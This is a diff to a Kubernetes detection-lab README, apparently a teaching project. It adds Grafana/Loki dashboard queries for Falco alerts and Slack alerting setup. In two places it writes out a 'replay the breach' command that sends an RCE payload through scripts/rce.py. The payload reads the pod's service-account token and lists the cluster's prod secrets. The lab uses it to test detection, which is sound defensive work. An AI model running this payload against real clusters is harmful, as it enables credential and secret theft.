@@ -11,6 +11,8 @@
   - [Custome falco](#custome-falco)
     - [Replay the breach → CRITICAL alert](#replay-the-breach--critical-alert)
   - [Install Loki + grafana](#install-loki--grafana)
+    - [Grafana dashboard](#grafana-dashboard)
+  - [Setup Slack](#setup-slack)
 
 ---
 
@@ -139,7 +141,6 @@ kubectl -n monitoring logs -f ds/falco -c falco | grep -i "Cluster secret"
 
 ## Install Loki + grafana
 
-
 - `argocd/platform/loki.yaml` — Loki (SingleBinary + filesystem), lab-grade
 - `argocd/platform/grafana.yaml` — Grafana + pre-wired Loki datasource
 - Falcosidekick → Loki output added in `argocd/platform/falco.yaml`:
@@ -153,32 +154,80 @@ falcosidekick:
 ```
 
 ```sh
-# sync via argocd
+# confirm
 kubectl -n argocd get app loki grafana
 # NAME      SYNC STATUS   HEALTH STATUS
-# grafana   Synced        Healthy
 # loki      Synced        Healthy
+# grafana   Synced        Healthy
 
 kubectl -n monitoring get pods | grep -E 'loki|grafana'
-# grafana-xxxxxxxxxx-xxxxx   1/1   Running
-# loki-0                     1/1   Running
-# loki-canary-...            (disabled) -> should NOT appear
+# grafana-858f74b497-ksjt4              1/1     Running   0          4m47s
+# loki-0                                2/2     Running   0          4m48s
 
-# confirm falcosidekick is pushing to loki (no connection errors)
 kubectl -n monitoring logs deploy/falco-falcosidekick | grep -i loki
-# [INFO]  : Loki - Publish OK ...
+# 2026/10/07 00:21:22 [ERROR] : Loki - Post "http://loki.monitoring:3100/loki/api/v1/push": dial tcp 10.96.242.149:3100: connect: connection refused
+# 2026/10/07 00:21:22 [ERROR] : Loki - Post "http://loki.monitoring:3100/loki/api/v1/push": dial tcp 10.96.242.149:3100: connect: connection refused
+# 2026/10/07 00:22:31 [INFO]  : Loki - POST OK (204)
+# 2026/10/07 00:22:31 [INFO]  : Loki - POST OK (204)
 ```
+
+### Grafana dashboard
 
 ```sh
 # open grafana (admin / admin)
 kubectl -n monitoring port-forward svc/grafana 3000:80
-# browse http://localhost:3000 -> Explore -> Loki datasource
-
-# LogQL: all falco events, then the cluster-secret rule
-#   {app="falcosidekick"}
-#   {app="falcosidekick"} |= "Cluster secret accessed"
 ```
+
+- browse http://localhost:3000 -> Explore -> Loki datasource
+  - Query labels:
+    - `{source="k8s_audit"}`
+    - `{priority="Critical"}`
+    - `{rule="Cluster Secret Accessed via K8s API"}`
+
+  ```sql
+  {priority="Critical", source="k8s_audit", rule="Cluster Secret Accessed via K8s API"} |= ``
+  ```
 
 - replay the breach (see above) and confirm the CRITICAL event shows in Grafana Explore.
 
+```sh
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=\$(cat \$SA/token);curl -sS --cacert \$SA/ca.crt -H \"Authorization: Bearer \$TOKEN\" \$APISERVER/api/v1/namespaces/prod/secrets"
+```
+
+![grafana_loki_log01](./img/grafana_loki_log01.png)
+
+![grafana_loki_log02](./img/grafana_loki_log02.png)
+
 ---
+
+## Setup Slack
+
+- 1. get Slack Incoming Webhook
+  - copy the URL: `https://hooks.slack.com/services/T.../B.../xxxx`
+
+- 2. Store the webhook as a secret (NOT in git)
+
+```sh
+# Grafana reads ${SLACK_WEBHOOK_URL} from this secret via envFromSecret.
+kubectl -n monitoring create secret generic grafana-slack --from-literal=SLACK_WEBHOOK_URL='https://hooks.slack.com/services/T.../B.../xxxx'
+# secret/grafana-slack created
+```
+
+- 3. Grafana alerting (provisioned in `argocd/platform/grafana.yaml`)
+
+```sh
+# restart grafana to pick up the secret + alerting provisioning
+kubectl -n argocd get app grafana        # Synced / Healthy
+kubectl -n monitoring rollout restart deploy/grafana
+
+# verify provisioning (Grafana UI -> Alerting)
+#   Contact points -> "slack"  (Test -> message appears in Slack)
+#   Alert rules    -> "Cluster Secret Accessed (React2Shell)"  state=Normal
+```
+
+- 4. Replay the breach → Slack alert
+
+```sh
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=\$(cat \$SA/token);curl -sS --cacert \$SA/ca.crt -H \"Authorization: Bearer \$TOKEN\" \$APISERVER/api/v1/namespaces/prod/secrets"
+
+```
